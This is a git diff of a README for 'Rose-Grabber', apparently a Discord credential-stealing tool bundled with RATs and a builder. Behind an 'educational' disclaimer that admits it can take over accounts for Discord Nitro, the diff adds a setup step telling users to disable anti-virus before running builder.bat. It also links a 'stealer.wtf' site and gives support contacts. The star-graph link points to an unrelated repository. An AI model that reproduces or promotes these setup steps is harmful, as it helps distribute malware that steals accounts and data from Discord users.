@@ -42,36 +42,40 @@
 
 </div>
 
-## Features
+### Features
 
 A list of features can be found in our [documentation](https://github.com/DamagingRose/Rose-Grabber/tree/main/docs/FEATURES.md).
 
-## Disclaimer
+### Disclaimer
 
 This tool is explicitly designed and provided exclusively for educational intentions. Its primary objective is to illuminate the vulnerabilities that files can be susceptible to, highlighting the need for proactive security measures. It is imperative that this tool is never leveraged for any illegal, unauthorized, or malicious undertakings. Under no circumstances will I assume liability for any detrimental consequences inflicted upon your computing infrastructure. I hereby absolve myself from any complicity in activities of an illicit nature. Emphatically, this tool's utility is confined to didactic objectives.
 
 Please be cognizant of the fact that nestled within the intricate architecture of this tool is an elaborate mechanism with latent potential, which, if wielded in an iniquitous manner, could conceivably lead to the illicit acquisition of Discord Nitro privileges through the exploitation of compromised accounts. Nevertheless, I vehemently discourage any endeavor to explore or exploit this covert facet for personal enrichment or unscrupulous exploits. The primary rationale behind divulging this concealed facet is to underscore the paramount importance of fortifying personal data security and adhering to the ethical deployment of technological instruments.
 
-## Setup
+### Setup
 
+**Make sure to disable your anti-virus before proceeding, so the important rose components dont get deleted.**
 - Download repository [here](https://github.com/DamagingRose/Rose-Grabber/archive/refs/heads/main.zip).
 - Extract packed contents. You can find a guide [here](https://www.top-password.com/knowledge/extract-files-from-zip-in-windows-10.html).
 - Launch UI by executing [`builder.bat`](https://github.com/DamagingRose/Rose-Grabber/blob/main/builder.bat).
 
-## Issues? Get help!
+### Issues? Get help!
 **You can contact us here:**
 - [Telegram](https://t.me/gumbobr0t)
 - [Discord](https://discord.com/invite/KnVcxx4JUJ)
 
-## Preview
+### Preview
 
-If you're still unsure you may check out the preview file in our [documentation](https://github.com/DamagingRose/Rose-Grabber/tree/main/docs/PREVIEW.md).
+If you're still unsure you may check out our [website](https://stealer.wtf)!
 
-## Changelog
+### Docs
+For more guidance on e.g. the rats or the builder, you should check out the [docs](https://github.com/DamagingRose/Rose-Grabber/tree/main/docs) folder.
+
+### Changelog
 
 The changelog history can be found in our [documentation](https://github.com/DamagingRose/Rose-Grabber/tree/main/docs/CHANGELOG.md).
 
-## Credits
+### Credits
 
 **We extend our deepest appreciation to these exceptional contributors. Their expertise and dedication have greatly enhanced this project.**
 
@@ -82,11 +86,13 @@ The changelog history can be found in our [documentation](https://github.com/Dam
 - [Rdimo](https://github.com/Rdimo)
 - [loTus04](https://github.com/loTus04)
 - [suvan1911](https://github.com/suvan1911)
-- [suegdu](https://github.com/suegdu)
+- [suegdu](https://github.com/suenerve)
 - [blank](https://github.com/blank-c)
-- [something-0001](https://github.com/something-0001)
+- [something-0001](https://github.com/smth.py)
+- [rud3p](https://github.com/rud3p)
 
 **Thank you all!**
 
-## Love to everyone 💞
-[![Stargazers repo roster for @DamagingRose/Rose-Grabber](https://reporoster.com/stars/dark/DamagingRose/Rose-Grabber)](https://github.com/DamagingRose/Rose-Grabber/stargazers)
+### Star Graph
+
+[![Star History Chart](https://api.star-history.com/svg?repos=Smug246/Luna-Grabber&type=Date)]
